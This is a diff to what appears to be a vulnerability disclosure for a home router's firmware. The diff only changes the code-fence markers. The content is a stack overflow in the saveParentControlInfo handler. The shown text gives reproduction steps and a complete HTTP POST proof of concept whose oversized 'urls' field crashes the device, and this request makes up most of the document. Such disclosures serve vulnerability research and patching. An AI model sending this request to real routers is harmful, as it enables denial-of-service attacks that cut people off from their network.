@@ -19,7 +19,7 @@ In function saveParentControlInfo, the content obtained by the program from the 
 In order to reproduce the vulnerability, the following steps can be followed:  
 1.Use the fat simulation firmware V15.03.05.19_multi  
 2.Attack with the following overflow POC attacks  
-'''
+```
 POST /goform/saveParentControlInfo HTTP/1.1  
 Host: 192.168.0.1  
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0  
@@ -35,6 +35,6 @@ Referer: http://192.168.0.1/parental_control.html?random=0.524930998878748&
 Cookie: password=0d403f6ad9aea37a98da9255140dbf6ecmucvb
 
 deviceId=02%3A03%3A04%3A05%3A06%3A07&deviceName=&enable=1&time=19%3A0021%3A00&url_enable=1&urls=ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss&day=1%2C1%2C1%2C1%2C1%2C1%2C1&limit_type=0
-'''
+```
 
 This PoC can result in a Dos.
